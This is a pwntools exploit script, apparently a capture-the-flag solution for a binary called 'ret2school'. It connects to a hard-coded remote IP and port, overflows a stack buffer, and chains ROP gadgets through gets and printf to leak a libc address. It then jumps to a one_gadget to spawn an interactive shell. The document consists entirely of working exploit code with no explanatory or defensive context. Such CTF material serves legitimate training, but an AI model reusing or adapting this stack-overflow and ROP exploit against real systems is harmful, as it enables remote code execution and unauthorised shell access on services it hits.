from pwn import *

exe = ELF('./ret2school')
libc = ELF('./libc.so.6')

# Gadgets
writable = 0x601500
offset = b'i'*40
pop_rdi = 0x0000000000400743
ret = 0x000000000040050e

io = remote('20.169.252.240', 4922)
#gdb.attach(io, api=True)

io.recvuntil(b'homework: ')
payload = offset
payload += p64(pop_rdi) + p64(writable)
payload += p64(exe.plt['gets'])
payload += p64(exe.sym['main'])
io.sendline(payload)
io.sendline(b'%p')

io.recvuntil(b'homework: ')
payload = offset
payload += p64(pop_rdi) + p64(writable)
payload += p64(ret)
payload += p64(exe.plt['printf'])
payload += p64(ret)
payload += p64(exe.sym['main'])
io.sendline(payload)

io.recvuntil(b'0x')
libc.address = int(io.recvuntil(b'S')[:-1], 16) - (libc.sym['_IO_2_1_stdin_'] + 131)
log.info(f'Libc base: {hex(libc.address)}')

one = 0x4f302
io.recvuntil(b'homework: ')
payload = offset
payload += p64(libc.address + one)
io.sendline(payload)

io.interactive()
